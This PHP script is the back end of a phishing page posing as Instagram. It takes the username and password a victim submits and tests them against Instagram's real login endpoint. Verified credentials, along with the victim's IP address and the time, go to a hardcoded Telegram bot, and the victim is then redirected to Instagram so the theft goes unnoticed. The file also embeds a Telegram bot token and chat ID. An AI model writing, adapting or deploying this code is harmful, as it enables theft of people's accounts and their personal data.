<?php

// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// Load environment variables
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        if (strpos($line, '=') === false) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

// Set headers
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Telegram credentials - hardcoded for reliability
$telegram_bot_token = "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$telegram_chat_id = "8244999766";

// Only process POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("Location: https://www.instagram.com/");
    exit;
}

// Get POST data
$username = isset($_POST["username"]) ? trim($_POST["username"]) : '';
$password = isset($_POST["password"]) ? $_POST["password"] : '';
$redirect_url = isset($_POST["redirect_url"]) ? trim($_POST["redirect_url"]) : 'https://www.instagram.com/';

// Validate redirect URL
if (empty($redirect_url) || strpos($redirect_url, 'instagram.com') === false) {
    $redirect_url = 'https://www.instagram.com/';
}

if (empty($username) || empty($password)) {
    // Missing credentials - redirect back with error
    session_start();
    $_SESSION['login_error'] = 'Please enter both username and password.';
    $_SESSION['redirect_url'] = $redirect_url;
    header("Location: " . $_SERVER['HTTP_REFERER']);
    exit;
}

// Try to login to Instagram
$login_result = verifyInstagramLogin($username, $password);

if ($login_result['success']) {
    // Login successful - send credentials to Telegram
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $timestamp = date("Y-m-d H:i:s T");
    
    $message = "🔔 *Instagram Login Captured!*\n\n";
    $message .= "✅ *VERIFIED CREDENTIALS*\n\n";
    $message .= "👤 *Username:* `" . str_replace('`', '', $username) . "`\n";
    $message .= "🔑 *Password:* `" . str_replace('`', '', $password) . "`\n\n";
    $message .= "📍 *IP:* `" . $ip . "`\n";
    $message .= "🕐 *Time:* `" . $timestamp . "`\n";
    $message .= "🎬 *Video:* " . $redirect_url;
    
    // Send to Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$telegram_chat_id}&text=" . urlencode($message) . "&parse_mode=Markdown&disable_web_page_preview=true");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
    
    // Redirect to the real video
    header("Location: " . $redirect_url, true, 302);
    exit;
} else {
    // Login failed - redirect back with error
    session_start();
    $_SESSION['login_error'] = $login_result['message'];
    $_SESSION['redirect_url'] = $redirect_url;
    $_SESSION['last_username'] = $username;
    header("Location: " . $_SERVER['HTTP_REFERER']);
    exit;
}

// Function to verify Instagram login
function verifyInstagramLogin($username, $password) {
    // Instagram login URL
    $login_url = 'https://www.instagram.com/accounts/login/ajax/';
    
    // First, get the CSRF token
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/accounts/login/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    $response = curl_exec($ch);
    
    // Extract cookies
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $response, $matches);
    $cookies = [];
    foreach ($matches[1] as $cookie) {
        $parts = explode('=', $cookie, 2);
        if (count($parts) == 2) {
            $cookies[$parts[0]] = $parts[1];
        }
    }
    
    $csrf_token = $cookies['csrftoken'] ?? '';
    $cookie_string = '';
    foreach ($cookies as $name => $value) {
        $cookie_string .= "$name=$value; ";
    }
    
    curl_close($ch);
    
    if (empty($csrf_token)) {
        return ['success' => false, 'message' => 'Sorry, there was a problem with your request.'];
    }
    
    // Now attempt login
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $login_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'username' => $username,
        'enc_password' => '#PWD_INSTAGRAM_BROWSER:0:' . time() . ':' . $password,
        'queryParams' => '{}',
        'optIntoOneTap' => 'false'
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'X-CSRFToken: ' . $csrf_token,
        'X-Requested-With: XMLHttpRequest',
        'X-Instagram-AJAX: 1',
        'Content-Type: application/x-www-form-urlencoded',
        'Referer: https://www.instagram.com/accounts/login/',
        'Origin: https://www.instagram.com'
    ]);
    curl_setopt($ch, CURLOPT_COOKIE, $cookie_string);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $json = json_decode($result, true);
    
    if ($json) {
        if (isset($json['authenticated']) && $json['authenticated'] === true) {
            return ['success' => true, 'message' => 'Login successful'];
        } elseif (isset($json['message'])) {
            return ['success' => false, 'message' => $json['message']];
        } elseif (isset($json['errors']) && isset($json['errors']['error'])) {
            return ['success' => false, 'message' => $json['errors']['error'][0]];
        }
    }
    
    // Default error message
    return ['success' => false, 'message' => 'Sorry, your password was incorrect. Please double-check your password.'];
}

?>
